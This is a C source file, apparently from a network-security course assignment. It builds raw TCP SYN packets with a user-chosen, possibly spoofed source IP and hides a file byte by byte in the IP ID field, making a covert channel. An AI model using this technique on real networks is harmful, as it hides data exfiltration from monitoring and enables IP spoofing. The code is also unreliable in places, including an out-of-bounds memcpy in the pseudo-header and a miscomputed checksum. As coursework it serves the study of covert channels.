//
//  client.c
//  
//	The client application implementation
//
//  
//	Created by Andrew Maledy on 2013-04-10.
//	COMP 8505 - Assignment 1
//
#include <unistd.h> //just the basics...
#include <stdio.h>			
#include <stdlib.h>
//#include <sys/socket.h>    //for socket 
#include <getopt.h>			//library for getting command line arguments...
#include <string.h>  //memset
#include <sys/ioctl.h> //for auto grabbing interface's ip...
#include <net/if.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include "tcp.h" //headers...
#include "ip.h" 
#include "client.h"

#define TH_SIN 0x06


void print_usage()
{
    printf("Usage: ./a.out -s <server-ip (source)> -d <server_ip (dest)> -p <port> -f <filename>\n -s, --client-ip     the source ip for the packet\n -d, --server-ip     the destination ip for the packet\n -p, --sport     the souce port of the packet\n -q, --dport     the destination port to use (server must be listening on this port)\n -i, --iface    If no source ip is specified, you may specify an interface's ip to use.\n -f, --filename     the name of the file you want to send.\n");
    exit(1);
}
int main(int argc, char *argv[])
{

	
	int c, long_index=0; //for getopt
	char *server_ip, *client_ip, *filename, *iface; // client collected data
	char buffer[PCKT_LEN];
	int sport = 0;
	int dport = 80;
	int sfd;
    int s = 0,i = 0;

	//int long_index=0;
    static struct option long_options[] = {
        {"server-ip",      required_argument, 0,  'd' },
        {"client-ip",      optional_argument, 0,  's' },
        {"sport",      optional_argument, 0,  'p' },
        {"dport",      required_argument, 0,  'q' },
        {"iface",      optional_argument, 0,  'i' },
        {"filename",      required_argument, 0,  'f' },
        {"help",      optional_argument, 0,  'h' }

    };
	while ((c = getopt_long (argc, argv, "s:c:p:d:f:i:h",long_options, &long_index)) != -1)
	         switch (c)
	           {
               case 's':
                    s=1;                         
                   client_ip = optarg;
                   break;
               case 'd':                                
                   server_ip = optarg;
                   break;
               case 'q':
                   sport = atoi(optarg);
                   break;
               case 'f':
                   filename = optarg;
                   break;
               case 'p':
                   dport = atoi(optarg);
                   break;
               case 'i':
                    i=1;
                    iface = optarg; 
                    break;
               case ':':
                    print_usage();
                    break;
               case 'h':
                    print_usage();
                    break;
                case '?':
                    print_usage();
                    break;
               default:
                    print_usage();
                    break;
	           }	           
	           
   if( server_ip == NULL)
   {
   	print_usage();
   	exit(EXIT_FAILURE);
   }
	if(sport == 0)
		sport = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
	
    /*
    * If client_ip wasnt supplied, let's just figure it out...
    */
    if(s == 0)
    {

        if(i == 0) //did they give us an interface instead? if not...we'll take a gues
        {
            char *d_if = "en1";
            iface = d_if;

        }
        char choice;
        client_ip = get_if_ip(iface);
        printf("IP (%s) found on Interface %s. \n", client_ip, iface);
        printf("This could be bad... are you sure you want to continue?\n");        
        choice = fgetc(stdin);
        
        if(choice != 'y')
        {
            printf("Quitting. No packets Sent. (Use -s switch to spoof an IP). \n");
            exit(EXIT_SUCCESS);          
        }

    }
	printf("Server IP: %s, Client IP: %s, Dest port: %d, Source. port: %d \n", server_ip, client_ip, dport, sport);

    /*
    * Done collecting arguments, set up file descriptors, our packet, and send the file
    * 
    */
	sfd = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);	

    if(sfd == -1)
    {
        //socket creation failed, probably not run as root...
        perror("Failed to create socket (check that you are root):");
        exit(1);
    }
 	char packet[4096]; //master packet buffer (we'll fill it in below)
 	memset (packet, 0, 4096);
 	//IP header
    struct ip *iph = (struct ip *) packet;
    //TCP header
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip)); //after the iphdr comes the tcphdr

    fill_iphdr(iph, client_ip, server_ip);
    fill_tcphdr(tcph, sport, dport);
    struct sockaddr_in sin; 
    struct pseudo_header pseudohdr;
 	
 	//address resolution
    sin.sin_family = AF_INET;
    sin.sin_port = htons(sport);
    sin.sin_addr.s_addr = inet_addr(server_ip);

    //Forge the TCP checksum
    pseudohdr.source_address = inet_addr( client_ip );
    pseudohdr.dest_address = sin.sin_addr.s_addr;
    pseudohdr.placeholder = 0;
    pseudohdr.protocol = IPPROTO_TCP;
    pseudohdr.tcp_length = htons(sizeof(struct tcphdr));
	memcpy(&pseudohdr , (char*) &pseudohdr , sizeof (struct pseudo_header));
    memcpy(&pseudohdr + sizeof(struct pseudo_header) , tcph , sizeof(struct tcphdr));
	//now set it with our pretend data ;)
	tcph->th_sum = calculate_checksum( (unsigned short*) &pseudohdr , iph->ip_len);
    
    int one = 1;
    const int *val = &one;
     
    if (setsockopt (sfd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
    {
        perror("Error setting IP_HDRINCL");
        exit(0);
    }
    //away we go...light up the line
    send_file(sfd, sin, packet, filename);
    printf("Sent file: %s\n", filename);

}
/*
* Function: send_file
* Author: Andrew Maledy
*
* Sends a file to the wire, byte by byte using the id field of the ip header.
* 
* Requires a file descriptor, socket address object, a packet, and the name of the file to send
*
*/
void send_file(int sfd, struct sockaddr_in sin,char* packet, char* filename)
{
    char ch;
    int ci; 
    FILE *file;
   
    //send filename
    for (ci = 0; ci < strlen(filename); ci++)
    {
        send_char(sfd, sin, packet, filename[ci]);

    }
    //send our end filename/file character -just an obscure character that won't get used (unless you're sending latin letters...)
    send_char(sfd, sin, packet, 0xFE);

    //Send file...
    if((file=fopen(filename,"rb"))== NULL)
     {
        printf("Can't open file %s \n",filename);
        exit(1);
     }
    else while((ch=fgetc(file)) !=EOF)
    //file opened...look through each character and send the packet
    {
        
        send_char(sfd, sin, packet, ch);
    }
    send_char(sfd, sin, packet, 0xFE); //we're done with the file, server drops out of loop and waits for new file.

}
void send_char(int sfd, struct sockaddr_in sin,char* packet, char to_send)
{

    //IP header for setting the covert field
    struct ip *iph = (struct ip *) packet;
    //TCP header for updating the checksum
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof (struct ip)); //after the iphdr comes the tcphdr        
    iph->ip_id = to_send; //the payload hidden in the id field
    tcph->th_seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
    if (sendto (sfd, packet, iph->ip_len ,  0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
    {
        perror("sendto failed");
    }
    //Data send successfully
    else
    {
        //printf ("%c" , iph->ip_id);
    }    
}
/*
* Function: fill_iphdr
* Author: Andrew Maledy
*
* Fills in an IP header with basic information
* 
* Requires a pointer to a header, a source ip and a destination ip
*
*/
void fill_iphdr(struct ip* iph, char* source_ip, char* dest_ip)
{
    //Fill in the IP Header
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 0;
    iph->ip_len = sizeof (struct ip) + sizeof (struct tcphdr);
    iph->ip_id = htons(54321); //Id of this packet
    iph->ip_off = 0;
    iph->ip_ttl = 255;
    iph->ip_p = IPPROTO_TCP;
    iph->ip_sum = 0;      //Set to 0 before calculating checksum

    iph->ip_src = inet_addr(source_ip);
    iph->ip_dst = inet_addr(dest_ip);


}
/*
* Function: fill_tcphdr
* Author: Andrew Maledy
*
* Fills in TCP header with basic information
* 
* Requires a pointer to a header, a source port and a destination port
*
*/
void fill_tcphdr(struct tcphdr* tcph, int source_port, int dest_port)
{
    //Fill in TCP Header
    tcph->th_sport = htons(source_port);
    tcph->th_dport = htons(dest_port);
    tcph->th_seq = 0;
    tcph->th_ack = 0;
    tcph->th_off = 5;  //tcp header size
    tcph->th_flags = TH_SIN;
    tcph->th_win = htons (5840); /* maximum allowed window size */
    tcph->th_sum = 0; //leave checksum 0 now, filled later by pseudo header
    tcph->th_urp = 0;

}
/*
* Function: get_if_ip
* Author: Andrew Maledy 
*
* Get the ip address associated with a specified interface
* 
* Requires an interface name (in the form of a string)
*
*/

char* get_if_ip(char* iface)
{
 int fd;
 struct ifreq ifr;

 fd = socket(AF_INET, SOCK_DGRAM, 0);

 /* Get an IPv4 IP address */
 ifr.ifr_addr.sa_family = AF_INET;

 /* I want IP address attached to the iface that was passed */
 strncpy(ifr.ifr_name, iface, IFNAMSIZ-1);

 ioctl(fd, SIOCGIFADDR, &ifr);

 close(fd);

 //return the ipaddress of the supplied interface
 return  inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr);

}
/*
* Calculates a TCP checksum.
* 
* Requires a pointer to a packet buffer, and the length.
*
*/
unsigned short calculate_checksum(unsigned short *buf, int len)
{
        unsigned long sum;
        for(sum=0; len>0; len--)
                sum += *buf++;
        sum = (sum >> 16) + (sum &0xffff);
        sum += (sum >> 16);
        return (unsigned short)(~sum);
}
